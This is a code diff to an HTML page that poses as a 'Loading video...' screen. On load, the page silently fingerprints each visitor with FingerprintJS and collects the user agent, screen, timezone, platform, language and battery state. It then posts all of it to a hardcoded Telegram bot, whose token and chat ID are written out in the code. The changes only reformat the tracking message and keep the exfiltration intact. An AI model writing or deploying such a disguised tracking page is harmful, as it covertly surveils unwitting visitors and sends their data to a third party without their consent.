@@ -2,6 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Loading video...</title>
   <script src="https://openfpcdn.io/fingerprintjs/v4"></script>
   <style>
@@ -33,9 +34,6 @@
 
   <script>
     (async () => {
-      const token = "7978235751:AAEsMF7a4-drLJCRGQGcco9EbznA4VPa6qg";
-      const chatId = "363719597";
-
       const fp = await FingerprintJS.load();
       const result = await fp.get();
 
@@ -45,25 +43,35 @@
         userAgent: navigator.userAgent,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         platform: navigator.platform,
-        battery: await navigator.getBattery().then(b => `Charging: ${b.charging}, Level: ${b.level}`).catch(() => "Battery API blocked"),
+        battery: await navigator.getBattery().then(b => ({
+          charging: b.charging,
+          level: b.level
+        })).catch(() => "Battery API blocked"),
       };
 
       const message = `
-🖥️ *New Device Info Collected:*
-- IP: ${result.ip}
-- Visitor ID: ${result.visitorId}
-- Screen: ${extraInfo.screen}
-- Language: ${extraInfo.language}
-- UserAgent: ${extraInfo.userAgent}
-- Timezone: ${extraInfo.timezone}
-- Platform: ${extraInfo.platform}
-- Battery: ${extraInfo.battery}
-      `;
+New Visit Detected! 🚀
+-----------------------------
+🖥️ VisitorID: ${result.visitorId}
+🌐 User-Agent: ${extraInfo.userAgent}
+📱 Screen: ${extraInfo.screen}
+🕰️ Timezone: ${extraInfo.timezone}
+🔋 Battery: ${typeof extraInfo.battery === 'string' ? extraInfo.battery : (extraInfo.battery.charging ? 'Charging' : 'Not Charging')} (${extraInfo.battery.level * 100}%)
+💻 Platform: ${extraInfo.platform}
+🗣️ Language: ${extraInfo.language}
+`;
 
-      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
+      const token = '7978235751:AAEsMF7a4-drLJCRGQGcco9EbznA4VPa6qg';
+      const chatId = '363719597';
+      const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage`;
+
+      fetch(telegramUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
       });
     })();
   </script>
